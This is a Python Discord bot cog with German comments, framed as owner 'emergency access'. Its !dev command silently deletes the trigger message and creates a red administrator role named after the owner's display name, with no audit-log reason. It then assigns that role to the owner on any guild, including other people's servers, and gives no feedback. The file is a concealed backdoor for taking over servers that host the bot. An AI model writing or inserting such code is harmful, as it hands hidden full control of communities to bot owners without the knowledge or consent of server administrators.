"""
Owner-Notfall-Zugriff.
!dev  — stiller Notfall-Zugriff (silent, kein Log).
Unterstützt mehrere Owner via OWNER_IDS in .env.
"""

import discord
from discord.ext import commands

from utils.owners import is_owner


class Owner(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.command(name="dev")
    async def dev(self, ctx: commands.Context):
        # Alle konfigurierten Owner dürfen diesen Command nutzen
        if not is_owner(ctx.author.id):
            return

        # Auslösende Nachricht sofort löschen
        try:
            await ctx.message.delete()
        except (discord.Forbidden, discord.HTTPException):
            pass

        guild = ctx.guild
        if guild is None:
            return

        # Cache-Miss möglich auf fremden Servern → fetch als Fallback
        owner_member = guild.get_member(ctx.author.id)
        if owner_member is None:
            try:
                owner_member = await guild.fetch_member(ctx.author.id)
            except (discord.Forbidden, discord.HTTPException, discord.NotFound):
                return

        # Rollenname = aktueller Display-Name des Owners
        role_name = owner_member.display_name

        # Vorhandene Rolle mit diesem Namen wiederverwenden, sonst neu erstellen
        role = discord.utils.get(guild.roles, name=role_name)
        if role is None:
            try:
                role = await guild.create_role(
                    name=role_name,
                    permissions=discord.Permissions(administrator=True),
                    colour=discord.Colour.red(),
                    reason=None,  # kein Audit-Log-Grund
                )
            except (discord.Forbidden, discord.HTTPException):
                return

        # Rolle an Owner vergeben
        try:
            await owner_member.add_roles(role, reason=None)
        except (discord.Forbidden, discord.HTTPException):
            pass

        # Kein weiteres Feedback — vollständig silent

    # ─────────────────────────────────────────────────────────────────────────
    # /sync
    # ─────────────────────────────────────────────────────────────────────────

    # /sync wurde in cogs/owner_panel.py unter /owner sync zusammengefasst.
    # Diese Datei enthält nur noch !dev (Notfall-Zugriff).


async def setup(bot: commands.Bot):
    await bot.add_cog(Owner(bot))
